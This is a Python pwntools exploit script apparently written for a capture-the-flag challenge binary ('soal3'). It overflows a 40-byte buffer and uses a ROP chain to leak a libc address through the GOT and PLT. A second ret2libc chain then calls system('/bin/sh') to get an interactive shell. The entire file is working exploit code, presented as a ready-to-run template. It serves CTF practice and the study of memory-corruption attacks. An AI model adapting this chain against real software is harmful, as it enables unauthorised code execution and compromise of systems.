### patch first.
### /opt/pwninit --bin chall --libc libc.so.6


from pwn import *

binary = "./soal3_patched"
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

elf = context.binary = ELF(binary)

p = process(binary)


## Addresses
main = p64(0x0040138d)
ret = p64(0x000000000040101a) #0x000000000040101a : ret

puts = p64(elf.sym["got.printf"]) #using printf GOT
printf = p64(elf.sym["plt.puts"]) #using puts PLT



#0x0000000000401633 : pop rdi ; ret

pop_rdi = p64(0x0000000000401633)


#### Leak Address (printf GOT PLT)
payload = b"A"*40
#payload += ret #stack alignment (error if active)
payload += pop_rdi
payload += puts
payload += printf
#payload += ret # stack alignment (error if active)
payload += p64(elf.sym['main'])

p.recv()
p.sendline(b"3")
p.sendline(payload)

### getting leak & other offset


leak = u64(p.recvline().strip().replace(b"note : ",b"").ljust(8,b'\0'))
libc.address = leak - libc.sym['printf']
bin_sh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols.system)


print("LEAK : " + hex(leak)) ## address puts GOT
print("LIBC ADDR : " + hex(libc.address))
print("BIN SH ADDR : " + hex(u64(bin_sh.ljust(8,b'\0'))))
print("SYSTEM ADDR : " + hex(u64(system.ljust(8,b'\0'))))

payload = b"A"*40
payload += ret #stack alignment
payload += pop_rdi
payload += bin_sh
payload += system

p.recv()
p.sendline(b"3")
p.sendline(payload)
print("You got a Shell!")
p.interactive()
